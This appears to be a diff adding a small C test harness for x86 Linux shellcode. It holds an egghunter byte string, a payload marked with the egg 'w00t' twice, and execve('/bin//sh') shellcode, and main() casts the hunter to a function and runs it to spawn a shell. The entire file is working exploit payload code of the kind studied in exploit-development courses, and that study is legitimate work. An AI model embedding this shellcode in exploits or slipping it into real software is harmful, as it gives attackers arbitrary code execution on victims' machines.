@@ -1,0 +1,22 @@
+char hunter[]= \
+"\x58\x40\x3c\xf2\x74\xfb\x81\x78\xf8\x77\x30\x30\x74\x75\xf2\x81\x78\xfc\x77\x30\x30\x74\x75\xe9\xff\xe0";
+
+char shellcode[] = \
+/** first w00t **/
+"\x77\x30\x30\x74"
+/** second w00t **/
+"\x77\x30\x30\x74"
+
+/** shellcode generated from execve-stack-egghunter **/
+"\x31\xc0\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
+
+
+int main(){
+
+     printf("Egghunter Length:  %d\n", strlen(hunter));
+     printf("Shellcode Length:  %d\n", strlen(shellcode));
+
+
+     (*(void  (*)()) hunter)();
+     return 0;
+}
